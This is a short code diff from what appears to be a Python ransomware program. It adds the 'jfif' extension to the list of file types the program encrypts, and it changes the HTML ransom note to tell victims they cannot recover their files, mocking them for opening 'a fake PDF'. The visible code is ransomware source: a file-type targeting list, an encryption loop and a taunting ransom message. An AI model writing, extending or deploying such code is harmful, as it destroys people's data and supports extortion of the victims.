@@ -22,7 +22,7 @@ def enc_file(filename):
             g.write(encrypted)
 
 def run_cryptor():
-    files = ["jpg", "jpeg", "png", "gif", "mp4", "wav", "mp3", "doc", "docx", "docb", "csv", "pdf", "rtf", "mp4", "xls", "xlsx", "ppt", "pptx", "txt"]
+    files = ["jpg", "jpeg", "png", "gif", "mp4", "wav", "mp3", "doc", "docx", "docb", "csv", "pdf", "rtf", "mp4", "xls", "xlsx", "ppt", "pptx", "txt", "jfif"]
     for i in files:
         
         enc_file(i)
@@ -61,7 +61,7 @@ def write_html():
                 <h1 id="header">Alert user all your files have been encrypted!!!</h1>
                 <h2 class="header2">Can I get my files back?</h2>
                 <p class="paras">
-                Absolutely a link will be provided to the decryption tool
+                Nope unless you can crack AES-128 bit encryption
                 It takes a special kind of stupid to click on something you shouldn't
                 You really fell for a fake PDF lol get rekt scrub
                 <br>
